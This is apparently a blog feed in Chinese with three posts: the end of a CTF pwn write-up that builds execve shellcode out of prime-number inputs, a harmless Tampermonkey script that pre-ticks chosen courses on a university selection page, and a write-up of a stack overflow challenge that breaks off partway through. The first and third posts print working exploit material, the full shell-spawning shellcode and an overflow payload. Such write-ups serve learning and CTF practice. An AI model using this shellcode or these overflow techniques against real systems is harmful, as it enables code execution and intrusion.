rbp<br>.text:00000000004005AB                 mov     edi, 1<br>.text:00000000004005B0                 xor     eax, eax<br>.text:00000000004005B2                 call    ___printf_chk<br>.text:00000000004005B7<br>.text:00000000004005B7 loc_4005B7:                             ; CODE XREF: main+BF↓j<br>.text:00000000004005B7                 lea     rdi, format     ; &quot;%u&quot;<br>.text:00000000004005BE                 xor     eax, eax<br>.text:00000000004005C0                 mov     rsi, r12<br>.text:00000000004005C3                 call    _scanf<br>.text:00000000004005C8                 inc     eax<br>.text:00000000004005CA                 cmp     eax, 1<br>.text:00000000004005CD                 jbe     short loc_400621<br>.text:00000000004005CF                 mov     edi, [rsp+28]   ; __int64<br>.text:00000000004005D3                 mov     [rsp+12], edi<br>.text:00000000004005D7                 call    _Z6millerx      ; miller(long long)<br>.text:00000000004005DC                 test    al, al<br>.text:00000000004005DE                 mov     edx, [rsp+12]   ; edx为input<br>.text:00000000004005E2                 jz      short loc_400606<br>.text:00000000004005E4                 lea     rsi, aGoodUIsPrime ; &quot;Good! %u is prime.\n&quot;<br>.text:00000000004005EB                 mov     edi, 1<br>.text:00000000004005F0                 xor     eax, eax<br>.text:00000000004005F2                 call    ___printf_chk<br>.text:00000000004005F7                 mov     edx, [rsp+28]<br>.text:00000000004005FB                 movsxd  rax, ebx<br>.text:00000000004005FE                 inc     ebx             ; 循环次数<br>.text:0000000000400600                 mov     [rsp+rax*4+32], edx ; 第一次rax=1<br>.text:0000000000400604                 jmp     short loc_400619<br>.text:0000000000400606 ; ---------------------------------------------------------------------------<br>.text:0000000000400606<br>.text:0000000000400606 loc_400606:                             ; CODE XREF: main+82↑j<br>.text:0000000000400606                 lea     rsi, aBadUIsNotPrime ; &quot;Bad! %u is not prime.\n&quot;<br>.text:000000000040060D                 mov     edi, 1<br>.text:0000000000400612                 xor     eax, eax<br>.text:0000000000400614                 call    ___printf_chk<br>.text:0000000000400619<br>.text:0000000000400619 loc_400619:                             ; CODE XREF: main+A4↑j<br>.text:0000000000400619                 cmp     ebx, 255<br>.text:000000000040061F                 jle     short loc_4005B7<br>.text:0000000000400621<br>.text:0000000000400621 loc_400621:                             ; CODE XREF: main+6D↑j<br>.text:0000000000400621                 call    rbp<br>.text:0000000000400623                 add     rsp, 1056<br>.text:000000000040062A                 xor     eax, eax<br>.text:000000000040062C                 pop     rbx<br>.text:000000000040062D                 pop     rbp<br>.text:000000000040062E                 pop     r12<br>.text:0000000000400630                 retn<br>.text:0000000000400630 ; &#125; // starts at 400560<br>.text:0000000000400630 main            endp<br></code></pre></td></tr></table></figure><p>先观察rbp，其最后一次被改变是在 <code>0x000000000040057D</code> ，<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">lea     rbp, [rsp+32]<br></code></pre></td></tr></table></figure> 这也是将buffer的地址加载到rbp里</p><p>再继续分析流程，<code>_scanf</code>读入一个4字节无符号整数到rsi寄存器中存储的地址，即上一步r12的地址（涉及的代码如下），<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">lea     r12, [rsp+28]<br>...<br>mov     rsi, r12<br></code></pre></td></tr></table></figure> 若输入非空则将那个数传给edi和地址 <code>[rsp+12]</code>，并代入函数 <code>_Z6millerx</code>做判断。判断成功则把那个数传给edx并写入 <code>[rsp+rax*4+32]</code>，即buffer</p><p>总结一下，即只有被该程序判定为质数的4字节无符号整数才能被存入buffer并在输入为空后被执行，即我们得让shellcode可以被分成许多4字节质数输入内存。</p><h2 id="构造shellcode">构造shellcode</h2><p>有用的网站：<ahref="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86/ x64 Assembler and Disassembler</a></p><p>要用syscall调用shell，各个寄存器的值应是：</p><ul><li>rax : 0x3b (系统调用号)</li><li>rdi : rsp的地址 (先要把/bin//sh压入栈顶)</li><li>rdx : 0</li><li>rsi : 0</li></ul><p>可以考虑将shellcode分解成一系列小片段，较少连续性，易于形成质数。</p><ul><li>注意：程序为小端序，shellcode执行也是从低地址到高地址，因此对应整数是倒过来看的</li></ul><p>例如下面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq         ;0x99<br>push rdx    ;0x52<br>cdq         ;0x99<br>pop rsi     ;0x5e<br><br>;对应的就是0x5e995299<br></code></pre></td></tr></table></figure><p>下面是作者找到的一些质数对应的汇编代码，基本覆盖全面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq<br>push rdx<br>cdq<br>pop rsi<br><br>cdq<br>xor rax,rax<br><br>cdq<br>cdq<br>push rdx<br>cdq<br><br>cdq<br>push rdx<br>pop rdi<br>push rdx<br><br>pop rdi<br>pop rdi<br>pop r9<br><br>shl r9,0x20<br><br>cdq<br>shr r9,1<br><br>;2 int<br>cdq<br>nop<br>mov r9d,0x68732f2f<br><br>;3 int<br>pop rdi<br>cdq<br>nop<br>add r9d,0x6e69622f<br>cdq<br>nop<br><br>;3<br>pop rdi<br>mov dl,0x0c<br>add r9,0x6e69622f<br>cdq<br>nop<br><br>cdq<br>push r9<br>nop<br><br>cdq<br>pop r10<br>nop<br><br>cdq<br>add rdi,r9<br><br>cdq<br>push rsp<br>mov dl,0x16<br><br>syscall<br>mov dl,0x5<br><br>mov bl,0x2<br>mov al,0x3b<br></code></pre></td></tr></table></figure><h3 id="寻找技巧">寻找技巧</h3><ul><li>多运用单字节、双字节的字节码，如: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq       ;0x99<br>nop       ;0x90<br>pop rdi   ;0x5f<br>push r9   ;0x41 0x51<br></code></pre></td></tr></table></figure></li><li>对一些需要凑成两到三个质数的可以用特定指令进行爆破<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov dl,0x??   ;0xb2 0x??  ??相同<br>;同理，可以是bl等，但需是无用的寄存器<br></code></pre></td></tr></table></figure></li></ul><h3 id="完整shellcode">完整shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq<br>push rdx<br>cdq<br>pop rsi<br><br>cdq<br>push rdx<br>pop rdi<br>push rdx<br><br>cdq<br>nop<br>mov r9d,0x68732f2f<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>shl r9,0x20<br><br>pop rdi<br>mov dl,0x0c<br>add r9,0x6e69622f<br>cdq<br>nop<br><br>cdq<br>push r9<br>nop<br><br>cdq<br>push rsp<br>mov dl,0x16<br><br>pop rdi<br>cdq<br>nop<br>add r9d,0x6e69622f<br>cdq<br>nop<br><br>cdq<br>xor rax,rax<br><br>mov bl,0x2<br>mov al,0x3b<br><br>syscall<br>mov dl,0x5<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于油猴的sep选课脚本安装使用</title>
    <link href="/2024/02/26/select-course-ucas/"/>
    <url>/2024/02/26/select-course-ucas/</url>
    
    <content type="html"><![CDATA[<p>本人上学期有两门课因为找了半天课在哪没选到课（火大😤），决定写一个帮选的脚本（只是相当于ctrl+F），即在进入选课界面后立即选好所有要选的课程，只需填入验证码并提交</p><span id="more"></span><h2 id="下载油猴">下载油猴</h2><p><strong>油猴</strong>（<strong>Tampermonkey</strong>）是一个浏览器插件，可以用本地脚本修改被访问网页。</p><blockquote><p><strong>官网介绍</strong></p><p>它允许用户自定义并增强您最喜爱的网页的功能。用户脚本是小型 JavaScript程序，可用于向网页添加新功能或修改现有功能。使用篡改猴，您可以轻松在任何网站上创建、管理和运行这些用户脚本。</p><p>例如，使用篡改猴，您可以向网页添加一个新按钮，可以快速在社交媒体上分享链接，或自动填写带有个人信息的表格。在数字化时代，这特别有用，因为网页常常被用作访问广泛的服务和应用程序的用户界面。</p></blockquote><h3 id="edge浏览器方法">1.edge浏览器方法</h3><p>点击右上角的三个点，选择 <strong><em>扩展</em></strong> ，点击<strong><em>管理扩展</em></strong></p><p><img src="select_course_youhou_ysj.png" alt="三个点" /> <imgsrc="select_course_youhou_kz.png" alt="点扩展" /></p><p>然后划到最底下，点击 <strong><em>获取 Microsoft Edge扩展</em></strong>，在搜索框里搜索 <strong>Tampermonkey</strong></p><figure><img src="select_course_youhou_hqtz.png"alt="获取 Microsoft Edge 扩展" /><figcaption aria-hidden="true">获取 Microsoft Edge 扩展</figcaption></figure><p>找到下面这个就是（我的已经下载过了）</p><figure><img src="youhou.png" alt="油猴" /><figcaption aria-hidden="true">油猴</figcaption></figure><p>下载好后在浏览器导航栏点击扩展小图标，让它在工具栏里显示</p><figure><img src="屏幕截图%202024-02-26%20134723.png" alt="显示它!" /><figcaption aria-hidden="true">显示它!</figcaption></figure><h3 id="其他浏览器">2.其他浏览器</h3><p>可以参考下面这几篇文章</p><p><ahref="https://blog.csdn.net/qq_42951560/article/details/109233301">油猴（Tampermonkey）安装教程</a></p><p><ahref="https://zhuanlan.zhihu.com/p/128453110">Tampermonkey油猴插件——安装与使用教程</a></p><p><ahref="https://zhuanlan.zhihu.com/p/387251122">最强浏览器插件：油猴脚本的安装及使用教程</a></p><h2 id="安装并使用选课脚本">安装并使用选课脚本</h2><p>点击导航栏上的小图标，点击添加新脚本，把原有默认的所有代码都删掉，将下面代码复制粘贴进去并保存</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         sep选课助手</span><br><span class="hljs-comment">// @namespace    https://gitee.com/dx3906999</span><br><span class="hljs-comment">// @version      2024-02-06</span><br><span class="hljs-comment">// @description  sep自动选择想选课程</span><br><span class="hljs-comment">// @author       dx3906999</span><br><span class="hljs-comment">// @match        https://xkcts.ucas.ac.cn/courseManageBachelor/selectCourse*</span><br><span class="hljs-comment">// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==</span><br><span class="hljs-comment">// @grant        none</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>    <span class="hljs-keyword">var</span> class_checkbox_elements=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;sids&quot;</span>);<br>    <br>    <span class="hljs-keyword">var</span> class_ids=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;class_checkbox_elements.<span class="hljs-property">length</span>;i++)&#123;<br>        class_ids[i]=class_checkbox_elements[i].<span class="hljs-property">value</span>;<br>    &#125;;<br><br>    <span class="hljs-keyword">var</span> class_codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;class_checkbox_elements.<span class="hljs-property">length</span>;j++)&#123;<br>        class_codes[j]=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;courseCode_&quot;</span>+class_ids[j]).<span class="hljs-property">textContent</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> sep_helper_str=<span class="hljs-string">&quot;B02GB003Y-03&quot;</span><span class="hljs-comment">//改成课程编号，格式是课程编号中间用空格连接</span><br><br><span class="hljs-comment">/*例子:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var sep_helper_str=&quot;B02GB003Y-04 B02GB003Y-03 B02GB003Y-05&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>    <span class="hljs-keyword">var</span> classes_selected=sep_helper_str.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">var</span> class_index;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k=<span class="hljs-number">0</span>;k&lt;classes_selected.<span class="hljs-property">length</span>;k++)&#123;<br>        class_index=class_codes.<span class="hljs-title function_">indexOf</span>(classes_selected[k]);<br>        <span class="hljs-keyword">if</span> (class_index!=-<span class="hljs-number">1</span>) &#123;<br>            class_checkbox_elements[class_index].<span class="hljs-property">checked</span>=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>    &#125;<br><br>&#125;)();<br><br></code></pre></td></tr></table></figure><p>使用时按中间那项说明修改代码即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>选课</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一道校内pwn题——hard_stack</title>
    <link href="/2024/02/25/ucas-ctf-pwn-hard-stack/"/>
    <url>/2024/02/25/ucas-ctf-pwn-hard-stack/</url>
    
    <content type="html"><![CDATA[<p>日常刷刷题 <span id="more"></span></p><p>先 <code>checksec</code> 一下 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(kali㉿helloeveryone)-[~/ctf/pwn/q20_hardstack]<br>└─$ checksec --file=hard_stack<br>[*] <span class="hljs-string">&#x27;/home/kali/ctf/pwn/q20_hardstack/hard_stack&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure> 没有金丝雀, 地址随机化,用户栈不可执行</p><p>再丢进ida看眼，<code>F5</code>一下</p><p>main: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something wrong with flag file.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">64</span>, stream);<span class="hljs-comment">//将字符串读到s中</span><br>  sub_400acd();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>sub_400acd: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sub_400acd</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [rsp+Fh] [rbp-31h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+3Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Who are you?&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>);                <span class="hljs-comment">//一次从缓冲区读一个字节</span><br>    <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> __int8)buf[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    buf[i + <span class="hljs-number">1</span>] = buf[<span class="hljs-number">0</span>];                        <span class="hljs-comment">// 漏洞:只要没有读入换行符或EOF就会一直读，造成栈溢出</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;                                <span class="hljs-comment">// 可以劫持程序流程</span><br>&#125;<br></code></pre></td></tr></table></figure> 在ida里看看其他函数</p><p>找到一个获得flag的函数 <code>sub_40076d</code> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_40067d</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);                               <span class="hljs-comment">//s即为刚刚读取flag的字符串地址</span><br>&#125;<br></code></pre></td></tr></table></figure>现在可以分析一下漏洞函数 <code>sub_400acd</code> 的栈了 <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000000000000040                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000039                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000038                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000037                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000036                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000035                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000034                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000033                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000032                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000031 buf             db ?</span><br><span class="hljs-deletion">-0000000000000030 var_30          db ?</span><br><span class="hljs-deletion">-000000000000002F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000029                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000028                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000027                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000026                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000025                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000024                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000023                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000022                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000021                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000020                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000019                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000018                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000017                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000016                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000015                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000014                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000013                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000012                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000011                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000010                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000009                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000008                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000007                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000006                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000005                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000004 var_4           dd ?</span><br><span class="hljs-addition">+0000000000000000  s              db 8 dup(?)</span><br><span class="hljs-addition">+0000000000000008  r              db 8 dup(?)</span><br><span class="hljs-addition">+0000000000000010</span><br><span class="hljs-addition">+0000000000000010 ; end of stack variables</span><br></code></pre></td></tr></table></figure><code>buf</code> 和 <code>var_30</code> 占45字节，属于<code>buf[45]</code> , <code>var_4</code> 则是变量 <code>i</code></p><p>由此，可以有一种思路: 将 <code>buf</code> 溢出覆盖 <code>i</code>实现栈上任意写</p><p>构造payload: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">44</span>+<span class="hljs-string">b&#x27;\x37&#x27;</span>+<span class="hljs-string">b&#x27;\x42&#x27;</span><br></code></pre></td></tr></table></figure> 前44个a是垃圾占位字符，填充<code>-0000000000000030</code> 到 <code>-0000000000000005</code>(ps:因为 <code>-0000000000000031</code> 总是储存当前字符)</p><p>后面写一个 <code>0x37</code> , 即将 <code>i</code>改成55。这是考虑到for循环后要有 <code>i++</code> , 即下一次写入的地址是<code>buf[(i++)+1]</code> , 此地址即为 <code>buf[57]</code> =<code>-0x31+0x39=0x8</code> , 